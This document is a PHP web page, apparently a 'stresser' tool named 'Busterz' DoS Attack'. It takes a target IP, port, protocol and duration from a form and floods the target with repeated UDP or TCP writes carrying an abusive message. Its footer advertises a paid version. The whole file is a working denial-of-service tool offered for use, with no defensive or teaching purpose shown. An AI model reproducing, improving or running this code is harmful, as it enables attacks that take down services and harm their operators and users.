<?php
set_time_limit(0);
ignore_user_abort(true);

$mt = '300'; // Max. time

function DoSAttack($host, $port, $method, $time){
	switch($method){
		case 'udp':
			$pref = 'udp://';
			break;

		case 'tcp':
			$pref = 'tcp://';
			break;

		default: 
			$pref = 'udp://';
	}

	$time = time()+$time;
	$packets = 0;

	for($i=0;$i<65535;$i++){
		$out = 'G1T DD0S3D B1TCH ';
    }

    while(1){	
	$packets++;
    	if(time() > $time){
    		$out = 'DoS Attack completed; sent: '.$packets.' packets.';
		break;
	}

	$fp = fsockopen($pref.$host, $port, $errno, $errstr, 5);

	if($fp){
		fwrite($fp, $out);
		fclose($fp);
    	}else{
    		$out = 'Couldn\'t connect to: '.$host.':'.$port.'; '.$errno.', '.$errstr;
    		break;
    	}
    }
    return $out;
}

function cleanString($string){ //will remove illegal chars soon
	$string = strtolower($string);
}

if(isset($_POST['host'])&&isset($_POST['port'])&&isset($_POST['method'])&&isset($_POST['time'])){
	$h = $_POST['host'];
	$p = $_POST['port'];
	$m = $_POST['method'];
	$t = $_POST['time'];

	if(!filter_var($h, FILTER_VALIDATE_IP)){
		die('Invalid IP Address.<meta http-equiv="refresh" content="3"/>');
	}

	if($p > 65535 || $p < 1){
		$p = rand(1,65535);
	}

	$m = cleanString($m);

	if($t > $mt){
		$t = $mt;
	}

	if($t < 0){
		$t = 1;
	}


	$output = DoSAttack($h, $p, $m, $t);
}
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<title>Busterz' DoS Attack</title>
		<style>
			html {
				background-color: rgb(0,0,0);
				color: rgb(255,0,0);
			}

			input {
				background-color: rgb(0,0,0);
				border-radius: 3px;
			}
		</style>
		<!--<link rel="favicon" type="image/x-icon" href="img/favicon.ico"/>-->
	</head>
	<body>
		<?php
		if(isset($output)){
			echo '<div>'.$output.'</div>'; //you can put some nice alert with output around this.
		}
		?>
		<div id="form">
			<fieldset style="border-radius: 4px; width: 500px;">
				<legend>Input</legend>
				<form method="post" style="text-align: center;">
					<input type="text" id="host" name="host" placeholder="Host" style="color: rgb(255,0,0);" required/><br />
					<input type="number" id="port" name="port" min="1" max="65535" placeholder="Port" style="color: rgb(255,0,0);" required/> | 
					<select name="method" style="color: rgb(117,117,117); background-color: rgb(0,0,0); border-radius: 3px;" required><option value="udp" selected disabled>-- Methods --</option><option value="udp">UDP</option><option value="tcp">TCP</option></select><br />
					<input type="number" id="time" name="time" min="1" max="<?php echo $mt; ?>" placeholder="Time" style="color: rgb(255,0,0);" required/><br />
					<input type="submit" value="Attack" style="color: rgb(255,0,0);"/>
				</form>
			</fieldset>
		</div>
		<small style="position: fixed; bottom: 0; left:0;">This is just a free version, paid version will be available soon.</small>
	</body>
</html>
